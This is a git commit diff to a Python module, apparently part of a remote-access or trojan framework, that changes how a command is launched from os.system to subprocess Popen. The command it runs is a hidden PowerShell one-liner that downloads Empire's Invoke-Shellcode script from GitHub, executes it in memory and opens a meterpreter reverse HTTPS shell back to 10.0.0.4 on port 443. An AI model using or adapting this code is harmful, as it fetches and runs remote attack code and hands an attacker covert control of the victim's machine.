0861b8253ae11da6dc7b829537c6e71b092aad32
Omri Inbar <user@LAPTOP-M0KNH4BM>
2017-10-22 12:50:28 +0300

    again

--- modules/openSession.py
+++ modules/openSession.py
@@ -1,8 +1,8 @@
-import os
+from subprocess import *
 
 
 def run(**args):
     print "[*] In OpenSession module."
-    os.system(
+    Popen(
         "powershell -windowstyle hidden -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Lhost 10.0.0.4 -Lport 443 -Payload windows/meterpreter/reverse_https -Force")
     return "Success"
